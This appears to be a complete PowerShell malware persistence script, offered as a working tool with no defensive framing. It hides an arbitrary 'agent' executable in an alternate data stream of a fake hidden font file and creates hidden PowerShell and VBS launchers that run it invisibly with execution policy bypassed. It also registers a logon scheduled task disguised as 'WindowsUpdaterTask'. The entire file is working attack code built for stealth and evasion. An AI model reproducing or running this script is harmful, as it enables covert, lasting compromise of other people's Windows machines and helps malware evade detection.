$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'

param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# --- 1. Create fake font file in Fonts folder ---
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
    attrib +h $fontDir
    Write-Output "[+] Created hidden fonts folder"
}

$fontFile = "$fontDir\seguibl.ttf"

# Remove any existing font file to ensure we start clean (avoid ADS write issues)
if (Test-Path $fontFile) {
    Remove-Item $fontFile -Force -ErrorAction SilentlyContinue
    Write-Output "[+] Removed existing font file"
}

# Create an empty file first
New-Item -ItemType File -Path $fontFile -Force | Out-Null
attrib +h $fontFile
Write-Output "[+] Created fresh font file: $fontFile"

# --- 2. Write agent to ADS using .NET method (reliable) ---
$streamName = "Zone.Identifier"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
try {
    # WriteAllBytes to the stream path: file:stream
    [System.IO.File]::WriteAllBytes("$fontFile`:$streamName", $agentBytes)
    Write-Output "[+] Agent embedded into ADS: $fontFile`:$streamName"
} catch {
    Write-Output "[-] Failed to write ADS: $_"
    exit
}

# --- 3. Create launcher script (run.ps1) with cleanup ---
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent.exe"

# Delete old temp file if it exists
if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }

# Extract agent from ADS
`$bytes = [System.IO.File]::ReadAllBytes("`$fontFile`:`$streamName")
if (`$bytes) {
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    Start-Process -WindowStyle Hidden `$tempAgent
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath
Write-Output "[+] Created launcher with cleanup: $launcherPath"

# --- 4. Create VBS launcher (completely invisible) ---
$vbsPath = "$fontDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath
Write-Output "[+] Created VBS launcher: $vbsPath"

# --- 5. Create scheduled task (run the VBS) ---
$taskName = "WindowsUpdaterTask"
$taskCreated = $false

# Try COM first
try {
    Write-Output "[*] Attempting to create task via COM..."
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $rootFolder = $taskService.GetFolder("\")
    try { $rootFolder.DeleteTask($taskName, 0) *>$null } catch { }

    $taskDefinition = $taskService.NewTask(0)
    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3

    $trigger = $taskDefinition.Triggers.Create(9)
    $trigger.UserId = $env:USERNAME

    $action = $taskDefinition.Actions.Create(0)
    $action.Path = "wscript.exe"
    $action.Arguments = "`"$vbsPath`""

    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
    Write-Output "[+] Scheduled task '$taskName' created/updated via COM (runs VBS)."
    $taskCreated = $true
} catch {
    Write-Output "[-] COM task creation failed: $_"
}

# Fallback to schtasks if COM failed
if (-not $taskCreated) {
    Write-Output "[*] Falling back to schtasks..."
    schtasks /delete /tn $taskName /f *>$null
    schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc onlogon /ru $env:USERNAME /f /it *>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Output "[+] Scheduled task '$taskName' created/updated via schtasks (runs VBS)."
        $taskCreated = $true
    } else {
        Write-Output "[-] schtasks failed with exit code $LASTEXITCODE"
    }
}

if (-not $taskCreated) {
    Write-Output "❌ Failed to create scheduled task."
} else {
    Write-Output ""
    Write-Output "✅ PERSISTENCE COMPLETE"
    Write-Output "Script location: $launcherPath"
    Write-Output "VBS launcher: $vbsPath"
    Write-Output "Agent hidden in: $fontFile`:$streamName"
    Write-Output "The scheduled task will run the VBS (invisible) on next logon."
}
